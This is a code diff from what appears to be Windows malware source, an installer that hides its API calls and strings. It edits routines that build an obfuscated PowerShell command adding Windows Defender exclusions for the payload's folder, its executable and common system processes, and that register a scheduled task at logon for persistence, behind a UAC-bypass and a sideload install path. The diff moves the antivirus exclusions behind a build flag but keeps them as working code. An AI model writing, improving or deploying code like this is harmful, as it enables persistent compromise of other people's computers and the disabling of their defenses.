@@ -147,25 +147,30 @@ static VOID RunWdExclude(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN PVOID pK32,
         else { FW(L"cmd.exe /c "); }
     }
 
-    // WD exclusions + task registration in one powershell -Command (no -EncodedCommand, avoids PSE74).
+    // Scheduled task registration (always) + WD exclusions (ENABLE_WD_EXCL only).
     // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
-    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
     BYTE xValName[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xValName);
-    FW(L"powershell -Command \"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
+    FW(L"powershell -Command \"");
+#ifdef ENABLE_WD_EXCL
     {
-        CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
-        SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
-        for (SIZE_T i = 1; i <= dlen; i++) {
-            if (szTmp[i-1] == '\\') {
-                if (!bFirst) { FW(L"','"); }
-                for (SIZE_T k = 0; k < i && fpos < 3190; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
-                bFirst = FALSE;
+        BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
+        FW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
+        {
+            CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
+            SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
+            for (SIZE_T i = 1; i <= dlen; i++) {
+                if (szTmp[i-1] == '\\') {
+                    if (!bFirst) { FW(L"','"); }
+                    for (SIZE_T k = 0; k < i && fpos < 3190; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
+                    bFirst = FALSE;
+                }
             }
         }
+        FW(L"','"); FA(szDestExe);
+        FW(L"');ExclusionProcess=@('"); FA((CHAR*)xPName);
+        FW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
     }
-    FW(L"','"); FA(szDestExe);
-    FW(L"');ExclusionProcess=@('"); FA((CHAR*)xPName);
-    FW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
+#endif /* ENABLE_WD_EXCL */
     FW(L"$a=New-ScheduledTaskAction -Execute '"); FA(szDestExe); FW(L"';");
     FW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
     FW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
@@ -276,10 +281,10 @@ VOID InstallAndTerminate(IN PAPI_HASHING pApi) {
         }
     }
 
-#ifdef UAC_BYPASS
-    RunWdExclude(pApi, pNtdll, pK32, szDestDir, szDestExe);
-    if (pSleep) pSleep(8000);
-#endif
+// #ifdef UAC_BYPASS
+//     RunWdExclude(pApi, pNtdll, pK32, szDestDir, szDestExe);
+//     if (pSleep) pSleep(8000);
+// #endif
 
     // 6. Copy EXE
     if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
@@ -409,7 +414,7 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
     Ins_ACat(szDestExe, (CHAR*)xPName2, MAX_PATH);
 
 #ifdef UAC_BYPASS
-    // 6a. [UAC] WD exclusions + scheduled task (with /pf argument) via elevated PS
+    // 6a. [UAC] Scheduled task (always) + WD exclusions (ENABLE_WD_EXCL only) via elevated PS
     {
         // Build cmd.exe chain directly into wFinal — no PowerShell needed
         SIZE_T fpos = 0;
@@ -422,25 +427,29 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
             if (pGSD) { pGSD(wSD, MAX_PATH); for (SIZE_T _i = 0; wSD[_i] && fpos < 5690; _i++) wFinal[fpos++] = wSD[_i]; SLW(L"\\cmd.exe /c "); }
             else { SLW(L"cmd.exe /c "); }
         }
-        // WD exclusions + task registration in one powershell -Command (no -EncodedCommand, avoids PSE74).
+        // Scheduled task registration (always) + WD exclusions (ENABLE_WD_EXCL only).
         // Register-ScheduledTask replaces schtasks to suppress default AC-power conditions.
-        { BYTE xPN3[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
-          BYTE xVN[]  = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN);
-          SLW(L"powershell -Command \"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
-          {
-              CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
-              SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
-              for (SIZE_T i = 1; i <= dlen; i++) {
-                  if (szTmp[i-1] == '\\') {
-                      if (!bFirst) { SLW(L"','"); }
-                      for (SIZE_T k = 0; k < i && fpos < 5690; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
-                      bFirst = FALSE;
-                  }
-              }
+        { BYTE xVN[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN);
+          SLW(L"powershell -Command \"");
+#ifdef ENABLE_WD_EXCL
+          { BYTE xPN3[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
+            SLW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
+            {
+                CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
+                SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
+                for (SIZE_T i = 1; i <= dlen; i++) {
+                    if (szTmp[i-1] == '\\') {
+                        if (!bFirst) { SLW(L"','"); }
+                        for (SIZE_T k = 0; k < i && fpos < 5690; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
+                        bFirst = FALSE;
+                    }
+                }
+            }
+            SLW(L"','"); SLA(szDestExe);
+            SLW(L"');ExclusionProcess=@('"); SLA((CHAR*)xPN3);
+            SLW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
           }
-          SLW(L"','"); SLA(szDestExe);
-          SLW(L"');ExclusionProcess=@('"); SLA((CHAR*)xPN3);
-          SLW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
+#endif /* ENABLE_WD_EXCL */
           SLW(L"$a=New-ScheduledTaskAction -Execute '"); SLA(szDestExe); SLW(L"' -Argument '/pf';");
           SLW(L"$t=New-ScheduledTaskTrigger -AtLogOn;");
           SLW(L"$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;");
